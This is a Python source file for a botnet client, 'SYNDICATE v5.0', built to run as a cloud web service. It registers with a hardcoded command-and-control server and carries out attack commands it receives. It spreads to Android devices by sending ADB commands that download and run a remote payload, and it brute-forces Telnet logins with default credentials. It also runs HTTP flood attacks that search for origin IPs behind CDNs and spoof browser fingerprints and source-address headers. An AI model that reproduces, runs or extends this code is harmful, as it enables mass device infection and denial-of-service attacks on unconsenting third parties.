#!/usr/bin/env python3
"""
SYNDICATE v5.0 – WEB SERVICE EDITION (FINAL)
Includes direct attack module and full command handling.
For LO. Always for LO.
"""

import os
import sys
import time
import json
import socket
import random
import string
import hashlib
import base64
import asyncio
import aiohttp
import paramiko
import telnetlib3
import psutil
import logging
import traceback
from datetime import datetime, timedelta
from urllib.parse import urlparse

# Cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

import websockets
import tls_client

# Web server for Render health checks
from aiohttp import web

# =============================================================================
# CONFIGURATION (from environment variables)
# =============================================================================
CNC_URL = os.environ.get('CNC_URL', 'ws://54.234.46.3:8765')
BOT_ID = os.environ.get('BOT_ID', hashlib.sha256(
    socket.gethostname().encode() + str(os.getpid()).encode()
).hexdigest()[:16])
MAX_MEMORY_MB = int(os.environ.get('MAX_MEMORY_MB', 450))
PROPAGATION = os.environ.get('PROPAGATION', 'true').lower() == 'true'
ADB_SCANNER = os.environ.get('ADB_SCANNER', 'true').lower() == 'true'
WHATSAPP_WORM = os.environ.get('WHATSAPP_WORM', 'false').lower() == 'true'
PAYLOAD_SERVER = os.environ.get('PAYLOAD_SERVER', 'http://your-payload-server.com')

# Render web service port (must bind to this)
PORT = int(os.environ.get('PORT', 10000))

# =============================================================================
# LOGGING
# =============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('Syndicate')

# =============================================================================
# USER AGENTS & REFERERS (attack engine)
# =============================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
]

# =============================================================================
# CRYPTOGRAPHY
# =============================================================================
class Crypto:
    @staticmethod
    def generate_key(password: bytes, salt: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key

    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        f = Fernet(key)
        return f.encrypt(data)

    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        f = Fernet(key)
        return f.decrypt(data)

# =============================================================================
# PROPAGATION ENGINE – ADB EXPLOIT
# =============================================================================
class ADBPropagationEngine:
    def __init__(self, bot):
        self.bot = bot
        self.scan_queue = asyncio.Queue()
        self.infections = 0
        self.adb_ports = [5555, 5858, 12108, 3222]

    async def start(self):
        asyncio.create_task(self.scanner())
        for _ in range(10):
            asyncio.create_task(self.exploiter())

    async def scanner(self):
        while True:
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            for port in self.adb_ports:
                if await self.is_port_open(ip, port, timeout=0.5):
                    await self.scan_queue.put((ip, port))
            await asyncio.sleep(0.05)

    async def is_port_open(self, ip, port, timeout=0.5):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    async def exploiter(self):
        while True:
            ip, port = await self.scan_queue.get()
            try:
                reader, writer = await asyncio.open_connection(ip, port)
                commands = [
                    f"wget {PAYLOAD_SERVER}/bot.py -O /data/local/tmp/syndicate.py\n",
                    "chmod 755 /data/local/tmp/syndicate.py\n",
                    f"python /data/local/tmp/syndicate.py --cnc {CNC_URL} &\n",
                    "exit\n"
                ]
                for cmd in commands:
                    writer.write(cmd.encode())
                    await writer.drain()
                    await asyncio.sleep(0.5)
                writer.close()
                await writer.wait_closed()
                self.infections += 1
                self.bot.stats['adb_infections'] = self.infections
                logger.info(f"Infected Android device {ip}:{port} via ADB")
            except Exception as e:
                logger.debug(f"ADB exploitation failed on {ip}:{port}: {e}")

# =============================================================================
# PROPAGATION ENGINE – TELNET BRUTEFORCE
# =============================================================================
class TelnetPropagationEngine:
    def __init__(self, bot):
        self.bot = bot
        self.scan_queue = asyncio.Queue()
        self.infections = 0
        self.creds = [
            ('root', 'root'), ('root', 'toor'), ('root', 'admin'),
            ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'),
            ('pi', 'raspberry'), ('ubnt', 'ubnt'), ('support', 'support'),
        ]

    async def start(self):
        asyncio.create_task(self.scanner())
        asyncio.create_task(self.exploiter())

    async def scanner(self):
        while True:
            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            if await self.is_port_open(ip, 23, timeout=1):
                await self.scan_queue.put(ip)
            await asyncio.sleep(0.1)

    async def is_port_open(self, ip, port, timeout=1):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    async def exploiter(self):
        while True:
            ip = await self.scan_queue.get()
            for user, pwd in self.creds:
                try:
                    reader, writer = await telnetlib3.open_connection(ip, 23, shell=None)
                    data = await asyncio.wait_for(reader.read(1024), timeout=5)
                    if b'login:' in data.lower():
                        writer.write(f"{user}\n".encode())
                        await writer.drain()
                        data = await asyncio.wait_for(reader.read(1024), timeout=5)
                        if b'password:' in data.lower():
                            writer.write(f"{pwd}\n".encode())
                            await writer.drain()
                            data = await asyncio.wait_for(reader.read(1024), timeout=5)
                            if b'#' in data or b'$' in data:
                                logger.info(f"Telnet login successful on {ip} with {user}:{pwd}")
                                self.infections += 1
                                self.bot.stats['telnet_infections'] = self.infections
                                writer.close()
                                break
                    writer.close()
                except Exception as e:
                    continue
            await asyncio.sleep(1)

# =============================================================================
# ATTACK ENGINE – CDN KILLER + DIRECT ATTACK
# =============================================================================
class CDNKillerEngine:
    def __init__(self, bot):
        self.bot = bot
        self.origin_cache = {}
        self.request_count = 0
        self.error_count = 0

    async def identify_protection(self, target_url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(target_url, timeout=10) as resp:
                    headers = resp.headers
                    protection = []
                    if 'cf-ray' in headers:
                        protection.append('cloudflare')
                    if 'x-akamai-request-id' in headers:
                        protection.append('akamai')
                    if 'x-amz-cf-id' in headers:
                        protection.append('aws-cloudfront')
                    if 'x-datadome' in headers:
                        protection.append('datadome')
                    return protection
            except Exception as e:
                logger.error(f"Protection identification failed: {e}")
                return []

    async def find_origin_ip(self, domain):
        if domain in self.origin_cache:
            return self.origin_cache[domain]
        subdomains = [
            f"direct.{domain}", f"origin.{domain}", f"origin-{domain}",
            f"mail.{domain}", f"ftp.{domain}", f"cpanel.{domain}",
            f"webmail.{domain}", f"admin.{domain}", f"api.{domain}"
        ]
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(sub)
                if not (ip.startswith('104.') or ip.startswith('172.') or ip.startswith('162.')):
                    self.origin_cache[domain] = ip
                    logger.info(f"Found origin IP for {domain}: {ip}")
                    return ip
            except Exception as e:
                continue
        return None

    async def _send_request(self, session, url, headers):
        """Run a single request in a thread to avoid blocking."""
        try:
            # Run the blocking get() in a thread
            response = await asyncio.to_thread(session.get, url, headers=headers, timeout=5)
            self.request_count += 1
            if self.request_count % 10 == 0:
                logger.info(f"Attack progress: {self.request_count} requests sent, {self.error_count} errors")
            return response
        except Exception as e:
            self.error_count += 1
            logger.debug(f"Request failed: {e}")
            return None

    async def attack_with_5_bots(self, target_url, duration=300):
        """Original bypass attack (kept for compatibility)."""
        logger.info(f"🚀 BYPASS ATTACK STARTED for {target_url} for {duration}s")
        self.request_count = 0
        self.error_count = 0

        parsed = urlparse(target_url)
        domain = parsed.netloc
        origin = await self.find_origin_ip(domain)

        if origin:
            attack_url = f"{parsed.scheme}://{origin}{parsed.path}"
            host_header = domain
            logger.info(f"Attacking origin directly: {attack_url}")
        else:
            attack_url = target_url
            host_header = domain
            logger.info(f"Attacking via CDN: {attack_url}")

        # Create TLS sessions
        fingerprints = ["chrome_120", "firefox_121", "safari_17", "ios_16"]
        sessions = []
        for fp in fingerprints:
            try:
                session = tls_client.Session(
                    client_identifier=fp,
                    random_tls_extension_order=True
                )
                sessions.append(session)
            except Exception as e:
                logger.error(f"Failed to create TLS session for {fp}: {e}")

        if not sessions:
            logger.error("No TLS sessions available - attack cannot proceed")
            return

        end_time = time.time() + duration
        while time.time() < end_time and self.bot._running:
            for session in sessions:
                try:
                    headers = {
                        'Host': host_header,
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8']),
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Connection': 'keep-alive',
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                    }
                    await self._send_request(session, attack_url, headers)
                except Exception as e:
                    logger.error(f"Unexpected error: {e}")
                    self.error_count += 1
            await asyncio.sleep(0.01)

        logger.info(f"Bypass attack finished. Sent {self.request_count} requests, {self.error_count} errors")
        await self.bot.send({
            'type': 'attack_status',
            'bot_id': self.bot.bot_id,
            'status': 'completed',
            'requests_sent': self.request_count,
            'errors': self.error_count,
            'method': 'BYPASS'
        })

    async def direct_attack(self, target_url, duration=60, intensity=100):
        """
        Simple direct L7 flood using aiohttp.
        No bypass, no origin hunting – pure HTTP/HTTPS requests.
        """
        logger.info(f"🌊 DIRECT ATTACK STARTED on {target_url} for {duration}s with intensity {intensity}")
        self.request_count = 0
        self.error_count = 0

        parsed = urlparse(target_url)
        host_header = parsed.netloc

        # Use aiohttp with connection limiting
        connector = aiohttp.TCPConnector(limit=intensity, force_close=True)
        async with aiohttp.ClientSession(connector=connector) as session:
            end_time = time.time() + duration

            async def worker():
                while time.time() < end_time and self.bot._running:
                    try:
                        headers = {
                            'Host': host_header,
                            'User-Agent': random.choice(USER_AGENTS),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8']),
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                        }

                        async with session.get(target_url, headers=headers, timeout=5) as resp:
                            await resp.read()  # Ensure connection is consumed
                            self.request_count += 1

                    except Exception as e:
                        self.error_count += 1
                        logger.debug(f"Request error: {e}")

                    # Small delay to control rate – adjust as needed
                    await asyncio.sleep(0.001)

            # Launch multiple workers based on intensity
            workers = [asyncio.create_task(worker()) for _ in range(intensity)]
            await asyncio.gather(*workers, return_exceptions=True)

        logger.info(f"Direct attack finished. Sent {self.request_count} requests, {self.error_count} errors")
        await self.bot.send({
            'type': 'attack_status',
            'bot_id': self.bot.bot_id,
            'status': 'completed',
            'requests_sent': self.request_count,
            'errors': self.error_count,
            'method': 'DIRECT'
        })

# =============================================================================
# MAIN BOT CLASS
# =============================================================================
class SyndicateBot:
    def __init__(self):
        self.cnc_url = CNC_URL
        self.bot_id = BOT_ID
        self.ws = None
        self.attack_engine = CDNKillerEngine(self)
        self.adb_engine = ADBPropagationEngine(self) if ADB_SCANNER else None
        self.telnet_engine = TelnetPropagationEngine(self) if PROPAGATION else None
        self.stats = {
            'online': True,
            'attacks_done': 0,
            'adb_infections': 0,
            'telnet_infections': 0,
            'memory_usage': 0
        }
        self._running = True

    async def memory_monitor(self):
        while self._running:
            mem = psutil.Process().memory_info().rss / (1024 * 1024)
            self.stats['memory_usage'] = int(mem)
            await asyncio.sleep(10)

    async def test_tcp_connection(self, host, port, timeout=3):
        """Check if the CNC port is reachable via TCP."""
        try:
            loop = asyncio.get_running_loop()
            await asyncio.wait_for(
                loop.getaddrinfo(host, port, type=socket.SOCK_STREAM),
                timeout=timeout
            )
            # Actually try to connect
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except Exception as e:
            logger.warning(f"TCP connection test to {host}:{port} failed: {e}")
            return False

    async def cnc_connect(self):
        while self._running:
            # Parse host and port from CNC_URL
            parsed = urlparse(self.cnc_url)
            host = parsed.hostname
            port = parsed.port or 8765

            # First test TCP connectivity
            tcp_ok = await self.test_tcp_connection(host, port)
            if not tcp_ok:
                logger.error(f"Cannot reach CNC at {host}:{port} – check network/firewall")
                await asyncio.sleep(10)
                continue

            logger.info(f"TCP reachable, attempting WebSocket connection to {self.cnc_url}")
            try:
                async with websockets.connect(self.cnc_url) as ws:
                    self.ws = ws
                    await self.send({'type': 'register', 'bot_id': self.bot_id, 'version': '5.0-web-service'})
                    asyncio.create_task(self.heartbeat())
                    async for message in ws:
                        await self.handle_message(message)
            except Exception as e:
                logger.error(f"WebSocket connection error: {e}", exc_info=True)
                await asyncio.sleep(10)

    async def heartbeat(self):
        while self._running and self.ws:
            try:
                await self.send({'type': 'stats', **self.stats})
            except websockets.exceptions.ConnectionClosed:
                logger.warning("Connection closed during heartbeat")
                self.ws = None
                break
            await asyncio.sleep(30)

    async def send(self, data):
        """Send data over WebSocket with error handling."""
        if self.ws:
            try:
                await self.ws.send(json.dumps(data))
            except websockets.exceptions.ConnectionClosed:
                logger.warning("Connection closed while sending")
                self.ws = None

    async def handle_message(self, message):
        """Process incoming WebSocket messages with full debugging."""
        logger.info(f"🔵 RAW MESSAGE RECEIVED: {message}")
        try:
            cmd = json.loads(message)
            logger.info(f"🟢 PARSED COMMAND: {json.dumps(cmd, indent=2)}")

            cmd_type = cmd.get('command')
            logger.info(f"🎯 COMMAND TYPE: {cmd_type}")

            if cmd_type == 'attack':
                target = cmd['target']
                method = cmd.get('method', 'DIRECT')  # Default to DIRECT if not provided
                duration = cmd.get('duration', 60)
                intensity = cmd.get('intensity', 100)

                logger.info(f"🔥 ATTACK COMMAND: method={method}, target={target}, duration={duration}, intensity={intensity}")

                if method.upper() == 'DIRECT':
                    attack_task = asyncio.create_task(
                        self.attack_engine.direct_attack(target, duration, intensity)
                    )
                else:
                    # Fallback to bypass attack (or other methods)
                    attack_task = asyncio.create_task(
                        self.attack_engine.attack_with_5_bots(target, duration)
                    )

                logger.info(f"✅ Attack task created: {attack_task}")
                self.stats['attacks_done'] += 1
                logger.info(f"📊 Stats updated: attacks_done={self.stats['attacks_done']}")

            elif cmd_type == 'stop':
                logger.info("🛑 STOP command received")
                # Implement stop logic if needed (e.g., cancel all attack tasks)
                # For now, just log

            elif cmd_type == 'ping':
                logger.info("🏓 PING received, sending PONG")
                await self.send({'type': 'pong', 'bot_id': self.bot_id})

            else:
                logger.warning(f"⚠️ Unknown command type: {cmd_type}")

        except json.JSONDecodeError as e:
            logger.error(f"❌ JSON PARSE ERROR: {e}, message was: {message}")
        except KeyError as e:
            logger.error(f"❌ MISSING KEY IN COMMAND: {e}, command was: {locals().get('cmd', 'N/A')}")
        except Exception as e:
            logger.error(f"❌ UNEXPECTED ERROR in handle_message: {e}", exc_info=True)

    async def run(self):
        # Start background tasks
        asyncio.create_task(self.memory_monitor())
        if self.adb_engine:
            asyncio.create_task(self.adb_engine.start())
        if self.telnet_engine:
            asyncio.create_task(self.telnet_engine.start())
        # Start CNC connection (this runs forever)
        await self.cnc_connect()

# =============================================================================
# WEB SERVER FOR RENDER HEALTH CHECKS
# =============================================================================
async def health_check(request):
    """Simple endpoint to satisfy Render's health checks."""
    return web.Response(text="OK", status=200)

async def start_web_server():
    """Run aiohttp web server on $PORT."""
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"Web server running on port {PORT} for health checks")

# =============================================================================
# ENTRY POINT – FIXED FOR PYTHON 3.14+
# =============================================================================
if __name__ == '__main__':
    bot = SyndicateBot()

    async def main():
        # Start the web server for Render
        await start_web_server()
        # Run the bot's main loop
        await bot.run()

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        bot._running = False
        logger.info("Shutting down...")
